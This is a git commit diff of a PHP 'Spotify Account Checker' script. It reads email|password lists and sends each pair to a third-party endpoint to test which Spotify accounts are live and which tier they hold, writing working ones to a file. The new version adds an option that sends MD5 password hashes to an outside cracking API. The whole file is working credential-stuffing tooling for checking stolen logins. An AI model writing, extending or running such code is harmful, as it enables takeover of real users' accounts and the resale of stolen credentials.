25fdcb3ce696abf774454a48752a54e85e394163
chopoyloris <43493244+chopoyloris@users.noreply.github.com>
2018-09-23 17:14:00 +0700

    Update spot.php

--- spot.php
+++ spot.php
@@ -1,57 +1,33 @@
 <?php
-/* Spotify Account Checker ./Mr.CH0P0Y
-/* USAGE : php file.php list.txt */
 error_reporting(0);
-$m="\033[1;31m";
-$k="\033[1;33m"; 
-$h="\033[1;32m"; 
-$b="\033[1;34m"; 
-if($argv[1]){
-	function cek($url){
-		$ch = curl_init();
-		curl_setopt($ch, CURLOPT_URL, $url);
-		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
-		$ex = curl_exec($ch);
-		curl_close($ch);
-		return($ex);
-	}
-	$list = explode("\r\n", file_get_contents($argv[1]));
-	echo $b."====================================\n";
-	$i = 1;
-	foreach ($list as $uname) {
-		$data1 = explode("|",$uname);
+function in_string($s,$as) {
+	$s=strtoupper($s);
+	if(!is_array($as)) $as=array($as);
+	for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
+	return false;
+}
+if(empty($argv[1])) exit("List empass mana?");
+$file = file_get_contents($argv[1]);
+$data = explode("\n",$file);
+for($a=0;$a<count($data);$a++){
+        $data1 = explode("|",$data[$a]);
         $email = $data1[0];
         $pass = $data1[1];
-		$cek = cek("https://www.ezcom-proaudio.my/sass/conn.php?email=$email&pass=$pass");
-		if(preg_match("/FAMILY/i", $cek)){
-			echo $b.$i++.") ".$k." ".$email."|".$pass." -> [PREMIUM FOR FAMILY]\n";
-			$hasil = "".$email."|".$pass." -> [PREMIUM FOR FAMILY]\n";
-			$file=fopen('spotify-live.txt',"a");
-            fwrite($file,$hasil);
-            fclose($file);
-		}else if(preg_match("/GAGAL/", $cek)){
-			echo $b.$i++.") ".$m." ".$email."|".$pass." -> Not Registered\n";
-		}else if(preg_match("/PREMIUM/", $cek)){
-			echo $b.$i++.") ".$k." ".$email."|".$pass." -> [PREMIUM]\n";
-			$hasil = "".$email."|".$pass." -> [PREMIUM]\n";
-			$file=fopen('spotify-live.txt',"a");
-            fwrite($file,$hasil);
-            fclose($file);
-		}else if(preg_match("/FREE/", $cek)){
-			echo $b.$i++.") ".$k." ".$email."|".$pass." -> [FREE]\n";
-			$hasil = "".$email."|".$pass." -> [FREE]\n";
-			$file=fopen('spotify-live.txt',"a");
-            fwrite($file,$hasil);
-            fclose($file);
-		}else{
-			echo $b.$i++.") ".$k." ".$email."|".$pass." -> [Menten dancok]\n";
-		}
+	if($argv[2]=="--md5"){
+		$get = @file_get_contents("https://lea.kz/api/hash/$pass");
+		$json = json_decode($get,true);
+		$pass = $json['password'];
 	}
-	echo $b."====================================\n";
-}else{
-	echo "Usage : php ".$argv[0]." list.txt";
+	$cek = @file_get_contents("https://www.ezcom-proaudio.my/sass/conn.php?email=$email&pass=$pass");
+	if (strpos($cek,"PREMIUM")) {
+                if(!in_array($cek,explode("\n",@file_get_contents("spotify-b.txt")))){
+                        $h=fopen("spotify-b.txt","a");
+                        fwrite($h,$cek."\n");
+                        fclose($h);
+                }
+		$cek = "\033[32m".$cek. "\033[0m";
+        }else{
+		$cek = "\033[31m".$cek. "\033[0m";
+	}
+        print("[$a/".count($data)."] ".$cek."\n");
 }
-?>
